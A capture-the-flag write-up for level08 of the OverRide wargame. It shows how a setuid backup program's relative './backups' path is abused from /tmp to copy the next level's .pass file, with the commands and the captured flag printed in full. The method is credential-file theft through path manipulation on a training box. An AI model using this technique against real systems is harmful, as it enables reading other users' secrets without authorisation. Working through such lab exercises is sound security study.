# Level08 Write-up

## Introduction

The file opens `./backup` and backs up the file passed as an argument, so let's try with that.

## Security Analysis

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08 
```

I have canary and multiple protections, so it's hard to exploit.

## Initial Attempt

So let's try:

```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

But it's not possible to open the file because the directory doesn't exist, and I don't have permission:

```bash
level08@OverRide:~/backups$ mkdir t
mkdir: cannot create directory `t': Permission denied
```

## Solution

So I need to find how to create `./backups/home/users/level09`.

I found the solution because in `/tmp` it's possible, and because it's RELATIVE `./backup`, it's possible to use any folder!

So:

```bash
mkdir -p /tmp/backups/home/users/level09/level09
```

Let's try:

```bash
level08@OverRide:/tmp$ mkdir -p /tmp/backups/home/users/level09
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
```

And found the flag:

```bash
cat /tmp/backups/home/users/level09/.pass
```

```bash
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## Flag

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
